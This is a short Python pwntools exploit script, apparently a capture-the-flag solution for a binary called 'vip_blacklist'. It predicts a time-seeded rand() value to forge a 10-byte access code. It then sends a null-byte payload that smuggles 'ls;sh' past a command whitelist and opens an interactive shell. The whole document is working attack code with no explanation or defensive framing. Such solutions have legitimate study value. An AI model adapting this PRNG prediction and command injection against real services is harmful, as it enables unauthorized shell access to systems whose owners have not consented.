from ctypes import CDLL
from math import floor
import time
from pwn import *

#Set up the libc for srand() and rand()
libc = CDLL("libc.so.6")


context.log_level = 'debug'
p = process("vip_blacklist")

#Seed rand() with srand()
now = int(floor(time.time()))
libc.srand(now)

#Create the random bytes
vip = bytearray(10)    
for i in range(10):
    vip[i] = libc.rand() % 256

#Send the payload
p.sendline(bytes(vip))
p.sendline(b"queue\0clear\0exit\0\0ls;sh\0")
p.sendline(b"ls;sh")
#This will also work locally but the server connection dropped input after the newline
#p.sendline(b"queue\nclear\0exit\0\0ls;sh\0")

#This was necessary on the server, but local you won't need it
#context.newline = b"\r\n"

p.interactive()
